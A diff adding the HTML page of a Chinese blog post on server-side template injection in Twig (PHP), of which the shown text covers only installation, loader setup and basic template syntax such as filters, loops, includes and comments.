@@ -1,0 +1,1300 @@
+<!DOCTYPE html>
+<html lang="en-uk" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='SSTI 模板注入：Twig(PHP) 接下来我们以Twig为例子具体来了解一下一个模板的工作原理以及可以利用的漏洞 简介与安装 详见官网安装文档：Twi'><title>SSTI 模板注入: Twig (PHP)</title>
+
+<link rel='canonical' href='https://ginkgo.org.cn/posts/ssti_twig/'>
+
+<link rel="stylesheet" href="/scss/style.min.450926226e724574a6b936335ea06111f8aeb253d932c86cb2cc807341cd2889.css"><meta property='og:title' content='SSTI 模板注入: Twig (PHP)'>
+<meta property='og:description' content='SSTI 模板注入：Twig(PHP) 接下来我们以Twig为例子具体来了解一下一个模板的工作原理以及可以利用的漏洞 简介与安装 详见官网安装文档：Twi'>
+<meta property='og:url' content='https://ginkgo.org.cn/posts/ssti_twig/'>
+<meta property='og:site_name' content='Under The Ginkgo'>
+<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='ssti' /><meta property='article:tag' content='twig' /><meta property='article:tag' content='php' /><meta property='article:tag' content='web_security' /><meta property='article:tag' content='template_engine' /><meta property='article:tag' content='server_side' /><meta property='article:published_time' content='2022-07-01T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-07-01T23:41:25&#43;01:00'/>
+<meta name="twitter:title" content="SSTI 模板注入: Twig (PHP)">
+<meta name="twitter:description" content="SSTI 模板注入：Twig(PHP) 接下来我们以Twig为例子具体来了解一下一个模板的工作原理以及可以利用的漏洞 简介与安装 详见官网安装文档：Twi">
+    <link rel="shortcut icon" href="/img/favicon.ico" />
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-ZKEXSTS2N4"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-ZKEXSTS2N4', { 'anonymize_ip': false });
+}
+</script>
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/Ginkgo_hu5438825b9b6d1014226d20d231e650c2_69187_300x0_resize_q75_box.JPG" width="300"
+                            height="237" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🧐</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Under The Ginkgo</a></h1>
+            <h2 class="site-description">BOYS FIGHT FOR YOUR LIBERTY</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/medic0803'
+                        target="_blank"
+                        title="A_GitHub"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='mailto:medicwrf@gmail.com'
+                        target="_blank"
+                        title="B_E-mail"
+                    >
+                        
+                        
+                            <?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1647773061437" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2742" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><defs><style type="text/css"></style></defs><path d="M937.593333 257.073333A148.353333 148.353333 0 0 0 832 213.333333H384v-42.666666h85.333333a85.333333 85.333333 0 0 0 0-170.666667H362.666667a21.333333 21.333333 0 0 0-21.333334 21.333333v192H212.26A53.426667 53.426667 0 0 0 160 170.666667h-64a53.393333 53.393333 0 0 0-53.333333 53.333333v533.333333a53.393333 53.393333 0 0 0 53.333333 53.333334h64a53.426667 53.426667 0 0 0 52.26-42.666667H384v192a21.333333 21.333333 0 0 0 21.333333 21.333333h170.666667a21.333333 21.333333 0 0 0 21.333333-21.333333v-192h362.666667a21.333333 21.333333 0 0 0 21.333333-21.333333V362.666667a148.353333 148.353333 0 0 0-43.74-105.593334zM512 85.333333a42.713333 42.713333 0 0 1-42.666667 42.666667H384V42.666667h85.333333a42.713333 42.713333 0 0 1 42.666667 42.666666zM170.666667 757.333333a10.666667 10.666667 0 0 1-10.666667 10.666667h-64a10.666667 10.666667 0 0 1-10.666667-10.666667V224a10.666667 10.666667 0 0 1 10.666667-10.666667h64a10.666667 10.666667 0 0 1 10.666667 10.666667z m384 181.333334H426.666667v-170.666667h128z m384-213.333334H213.333333V256h128v149.333333a21.333333 21.333333 0 0 0 21.333334 21.333334h85.333333a21.333333 21.333333 0 0 0 0-42.666667h-64V256h448c58.813333 0 106.666667 47.853333 106.666667 106.666667z" fill="#bababa" p-id="2743"></path></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" >
+                CTF
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/posts/ssti_twig/">SSTI 模板注入: Twig (PHP)</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jul 01, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    11 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="ssti-模板注入-twig--php">SSTI 模板注入：Twig(PHP)</h2>
+<p>接下来我们以Twig为例子具体来了解一下一个模板的工作原理以及可以利用的漏洞 <!-- raw HTML omitted --></p>
+<h3 id="简介与安装">简介与安装</h3>
+<p>详见官网安装文档：<a class="link" href="https://twig.symfony.com/doc/3.x/intro.html#installation"  target="_blank" rel="noopener"
+    >Twig Docs: Introduction</a> <!-- raw HTML omitted --></p>
+<p>Twig 3.x需要PHP版本高于7.2.5 <!-- raw HTML omitted --></p>
+<p>安装 <!-- raw HTML omitted --></p>
+<p>建议通过Composer命令进行安装 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">composer require <span class="s2">&#34;twig/twig:^3.0&#34;</span>
+</span></span></code></pre></div><p>基础的API调用实例 <!-- raw HTML omitted --></p>
+<p>通过require包含twig的项目文件，可以在Twig的命名空间下调用ArrayLoader类来加载模板（例如这里index就是一个模板），以及Environment类创建环境保存配置 <!-- raw HTML omitted --></p>
+<p><code>render()</code> 方法的第一个参数是用来加载模板的，第二个参数用来对模板中的占位内容进行填充（渲染） <!-- raw HTML omitted --></p>
+<p>这里 $twig-render 方法就是加载了模板 <code>index</code>, 并在 <code>{{name}}</code> 的位置上填充了 <code>Fabien</code>  <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">require_once</span> <span class="s1">&#39;/path/to/vendor/autoload.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$loader</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\Twig\Loader\ArrayLoader</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;index&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Hello {{ name }}!&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$twig</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\Twig\Environment</span><span class="p">(</span><span class="nv">$loader</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$twig</span><span class="o">-&gt;</span><span class="na">render</span><span class="p">(</span><span class="s1">&#39;index&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;name&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Fabien&#39;</span><span class="p">]);</span>
+</span></span></code></pre></div><p>另一种形式的加载起就是直接将模板以文件的形式进行存储，我认为这也是更为常见的形式，用到的加载器类是 <code>FilesystemLoader</code> 可以直接加载存储模板的目录 <!-- raw HTML omitted --></p>
+<p>可以看到这里变成了加载一个模板文件 <code>index.html</code>  <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$loader</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\Twig\Loader\FilesystemLoader</span><span class="p">(</span><span class="s1">&#39;/path/to/templates&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$twig</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\Twig\Environment</span><span class="p">(</span><span class="nv">$loader</span><span class="p">,</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;cache&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;/path/to/compilation_cache&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$twig</span><span class="o">-&gt;</span><span class="na">render</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;name&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Fabien&#39;</span><span class="p">]);</span>
+</span></span></code></pre></div><h3 id="基础语法">基础语法</h3>
+<p>参考：<a class="link" href="https://twig.symfony.com/doc/3.x/templates.html"  target="_blank" rel="noopener"
+    >Twig for Template Designers</a> <!-- raw HTML omitted --></p>
+<p>就像我们在模板引擎一节中提到的那样，模板，template本质上就是一个文本文件，通过与数据库的数据进行结合之后，用来生成我们所需要的任何基于文本的格式文件 (e.g., HTML, XML, CSV, LaTeX)，因此也没有特别的后缀名，.html, .xml, .twig 都可以 <!-- raw HTML omitted --></p>
+<p>模板中含有 <code>variables 变量</code> 或者  <code>expressions 表达式</code>, 当模板被模板引擎激活的时候这些内容就会被替换，还有 <code>tags 标签</code>, 用来控制模板的逻辑 <!-- raw HTML omitted --></p>
+<p>接着我们用一个简单的例子来说明一些基础语法 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>My Webpage<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">ul</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;navigation&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        {% for item in navigation %}
+</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;{{ item.href }}&#34;</span><span class="p">&gt;</span>{{ item.caption }}<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        {% endfor %}
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>My Webpage<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        {{ a_variable }}
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>上面的html中出现了两种符号： <!-- raw HTML omitted --></p>
+<ul>
+<li>{% &hellip; %} 用来运行指令，比如循环 <!-- raw HTML omitted --></li>
+<li>{{ &hellip; }} 用来输出表达式的结果 <!-- raw HTML omitted --></li>
+</ul>
+<!-- raw HTML omitted -->
+<dl>
+<dt>变量</dt>
+<dd>{{ foo.bar } <!-- raw HTML omitted -->
+网页应用可以将变量传递到模板中，从而改变模板中的内容。 <!-- raw HTML omitted -->
+<p>这些变量同样可以拥有能够访问的属性和子元素，可以使用 <code>.</code> 来进行访问 <!-- raw HTML omitted --></p>
+</dd>
+<dt>全局变量</dt>
+<dd><ul>
+<li>
+<p>_self: 对于当前模板的引用 <!-- raw HTML omitted --></p>
+</li>
+<li>
+<p>_context: 对于上下文的引用 <!-- raw HTML omitted --></p>
+</li>
+<li>
+<p>_charset: 对于当前字符集的引用 <!-- raw HTML omitted --></p>
+</li>
+</ul>
+</dd>
+<dt>变量赋值</dt>
+<dd>使用  <code>set</code>  标签为变量赋值 <!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nx">set</span> <span class="nx">foo</span> <span class="o">=</span> <span class="s1">&#39;foo&#39;</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nx">set</span> <span class="nx">foo</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">]</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nx">set</span> <span class="nx">foo</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;foo&#39;</span><span class="o">:</span> <span class="s1">&#39;bar&#39;</span><span class="p">}</span> <span class="o">%</span><span class="p">}</span>
+</span></span></code></pre></div></dd>
+<dt>Filters 过滤器</dt>
+<dd>Filter过滤器可以用来修改变量，同时可以使用管道符 <code>|</code> 来间隔多个过滤器从而对变量进行多次的处理，每一个过滤器处理的结果会传递到下一个 <!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{{</span> <span class="nx">name</span><span class="o">|</span><span class="nx">striptags</span><span class="o">|</span><span class="nx">title</span> <span class="p">}}</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="c1">// {{ &#39;&lt;a&gt;whoami&lt;a&gt;&#39;|striptags|title }}
+</span></span></span><span class="line"><span class="cl"><span class="c1">// Output: Whoami!
+</span></span></span></code></pre></div><p>上面的表达式就是对 <code>name</code> 这个变量进行修改，首先通过 <code>striptags</code> 移除所有的HTML标签，然后再利用 <code>title</code> 进行首字母大写 <!-- raw HTML omitted --></p>
+</dd>
+</dl>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{{</span> <span class="k">list</span><span class="o">|</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">)</span> <span class="p">}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{{</span> <span class="k">list</span><span class="o">|</span><span class="nx">join</span> <span class="p">}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span> <span class="k">list</span><span class="o">|</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">)</span> <span class="p">}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// {{ [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;]|join }}
+</span></span></span><span class="line"><span class="cl"><span class="c1">// Output: abc
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">// {{ [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;]|join(&#39;|&#39;) }}
+</span></span></span><span class="line"><span class="cl"><span class="c1">// Output: a|b|c
+</span></span></span></code></pre></div><p>过滤器同样可以设置参数来对变量进行处理 <!-- raw HTML omitted --></p>
+<p>比如上面的表达式， <code>list</code> 是一个列表，利用 <code>join</code> 标签对其中的元素进行组合，并且设置参数使用 <code>,</code> 进行分隔 <!-- raw HTML omitted --></p>
+<p>如果需要对一个区域的HTML代码进行处理，可以使用 <code>apply</code> 标签，这将可以使一个区域的所有文字内容都变成大写 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nx">apply</span> <span class="nx">upper</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">This</span> <span class="nx">text</span> <span class="nx">becomes</span> <span class="nx">uppercase</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nx">endapply</span> <span class="o">%</span><span class="p">}</span>
+</span></span></code></pre></div><p>更多过滤器的内容详见：<a class="link" href="https://twig.symfony.com/doc/3.x/filters/index.html"  target="_blank" rel="noopener"
+    >Filters</a> <!-- raw HTML omitted --></p>
+<dl>
+<dt>函数</dt>
+<dd></dd>
+</dl>
+<p>Twig内置了一些函数可供使用，和常见的语言类似，只需要函数名+()就可以调用函数，同时也可以使用参数名来对参数进行赋值 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="nx">i</span> <span class="nx">in</span> <span class="nx">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{{</span> <span class="nx">i</span> <span class="p">}},</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">endfor</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="nx">i</span> <span class="nx">in</span> <span class="nx">range</span><span class="p">(</span><span class="nx">low</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="nx">high</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span> <span class="nx">step</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{{</span> <span class="nx">i</span> <span class="p">}},</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">endfor</span> <span class="o">%</span><span class="p">}</span>
+</span></span></code></pre></div><p>更多函数的内容详见：<a class="link" href="https://twig.symfony.com/doc/3.x/functions/index.html"  target="_blank" rel="noopener"
+    >functions</a> <!-- raw HTML omitted --></p>
+<dl>
+<dt>控制结构</dt>
+<dd>控制结构指的就是那些可以控制程序执行的结构，例如if/elseif/else,for等带有条件的结构，在twig中需要用 <code>{% ... %}</code> 来包裹使用 <!-- raw HTML omitted --></dd>
+</dl>
+<p>for标签 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Members<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    {% for user in users %}
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>{{ user.username|e }}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    {% endfor %}
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>if标签 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">{% if users|length &gt; 0 %}
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        {% for user in users %}
+</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>{{ user.username|e }}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        {% endfor %}
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">{% endif %}
+</span></span></code></pre></div><p>更多内置标签的信息详见：<a class="link" href="https://twig.symfony.com/doc/3.x/tags/index.html"  target="_blank" rel="noopener"
+    >tags</a>  <!-- raw HTML omitted --></p>
+<dl>
+<dt>注释</dt>
+<dd>使用 <code>{# ... #}</code> 对模板内的代码块进行注释 <!-- raw HTML omitted --></dd>
+</dl>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{</span><span class="c1"># note: disabled template because we no longer use this
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="nx">user</span> <span class="nx">in</span> <span class="nx">users</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">...</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span><span class="o">%</span> <span class="k">endfor</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#}
+</span></span></span></code></pre></div><dl>
+<dt>包含其他的模板</dt>
+<dd><code>include</code>  函数可以将另一个模板所渲染的内容包含在当前模板中 <!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{{</span> <span class="k">include</span><span class="p">(</span><span class="s1">&#39;sidebar.html&#39;</span><span class="p">)</span> <span class="p">}}</span>
+</span></span></code></pre></div><p>被包含的模板将与当前模板共享上下文的全局变量 <!-- raw HTML omitted --></p>
+</dd>
+</dl>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="nx">box</span> <span class="nx">in</span> <span class="nx">boxes</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{{</span> <span class="k">include</span><span class="p">(</span><span class="s1">&#39;render_box.html&#39;</span><span class="p">)</span> <span class="p">}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">endfor</span> <span class="o">%</span><span class="p">}</span>
+</span></span></code></pre></div><p>例如被包含的模板 <code>render_box.html</code> 就可以访问当前模板中的变量 <code>box</code> <!-- raw HTML omitted --></p>
+<dl>
+<dt>模板继承</dt>
+<dd>Twig中最强大的功能就是模板继承，模板继承功能允许你构建一个基础的模板骨架，其中包括了所有网站需要的内容，并预留出 <code>blocks 区块</code> 以供子模板来进行重写 <!-- raw HTML omitted -->
